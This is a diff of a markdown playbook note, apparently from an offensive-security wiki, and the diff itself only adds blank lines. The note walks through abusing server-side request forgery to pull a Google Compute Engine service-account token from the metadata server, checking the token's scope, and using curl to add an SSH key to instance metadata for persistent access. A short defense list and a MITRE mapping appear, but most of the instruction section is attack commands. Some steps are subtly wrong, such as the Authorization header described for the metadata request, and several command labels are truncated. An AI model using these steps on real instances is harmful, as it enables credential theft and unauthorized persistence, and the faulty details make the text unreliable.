@@ -35,6 +35,8 @@ This procedure involves exploiting a server-side request forgery vulnerability i
 
 This procedure involves exploiting a server-side request forgery vulnerability in order to obtain an access token for a Google Compute Engine instance service account. Once the token is obtained, the attacker can use it to add an SSH key to the instance, providing persistent access to the compromised system. Server-side request forgery vulnerabilities allow an attacker to send crafted requests from the vulnerable server, potentially bypassing firewalls and other security measures. By exploiting this vulnerability, an attacker can gain access to sensitive information and systems.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable server with a server-side request forgery vulnerability
@@ -42,6 +44,8 @@ This procedure involves exploiting a server-side request forgery vulnerability i
 1. Knowledge of the Google Compute Engine instance service account token and scope checker
 
 1. Ability to add an SSH key to a Google Cloud Compute Engine instance
+
+ 
 
 ## Defense
 
@@ -51,19 +55,31 @@ This procedure involves exploiting a server-side request forgery vulnerability i
 
 1. Use multi-factor authentication and strong passwords to protect against unauthorized access
 
+ 
+
 ## Objectives
 
 1. Obtain an access token for a Google Compute Engine instance service account
 
 1. Add an SSH key to the compromised instance for persistent access
 
+ 
+
 # Instructions
 
 1. To retrieve the access token for the default service account of a Google Compute Engine instance, send a GET request to the above URL with an 'Authorization' header set to 'Bearer <metadata server access token>'.
 
+ 
+
+
+
 **Code**: [[http://metadata.google.internal/computeMetadata/v1]]
 
+
+
 > This command is useful for applications running on a Google Compute Engine instance that need to authenticate with Google APIs using the default service account. The access token can be used to make authorized API requests.
+
+
 
 **Command** ([[Get Token]]):
 
@@ -71,11 +87,21 @@ This procedure involves exploiting a server-side request forgery vulnerability i
 http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
 ```
 
+
+
 2. To check the scope of a token, run the following command in your terminal:
+
+ 
+
+
 
 **Code**: [[$ curl https://www.googleapis.com/oauth2/v1/tokeni]]
 
+
+
 > This command checks the scope of an access token that was generated using OAuth2.0. The 'scope' field in the response shows the list of permissions that the token has been granted. This is useful in verifying that the token has the necessary permissions to access the resources that your application requires.
+
+
 
 **Command** ([[Get Token Information]]):
 
@@ -83,11 +109,21 @@ http://metadata.google.internal/computeMetadata/v1beta1/instance/service-account
 $ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA
 ```
 
+
+
 3. To add an SSH key to a Google Cloud Compute Engine Instance, use the following command:
+
+ 
+
+
 
 **Code**: [[curl -X POST "https://www.googleapis.com/compute/v]]
 
+
+
 > This command uses cURL to make a POST request to the Google Cloud Compute Engine API. The `Authorization` header is used to authenticate the request with a bearer token. The `Content-Type` header specifies that the data being sent is in JSON format. The `--data` option is used to specify the metadata key-value pair to be added to the instance. Replace `sshkeyname` and `sshkeyvalue` with the name and value of your SSH key respectively.
+
+
 
 **Command** ([[Set Common Instance Metadata]]):
 
@@ -97,6 +133,8 @@ curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCo
 -H "Content-Type: application/json" 
 --data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -122,3 +160,5 @@ curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCo
 - [[Server-Side Request Forgery]]
 - [[SSRF URL for Cloud Instances]]
 - [[SSRF URL for Google Cloud]]
+
+
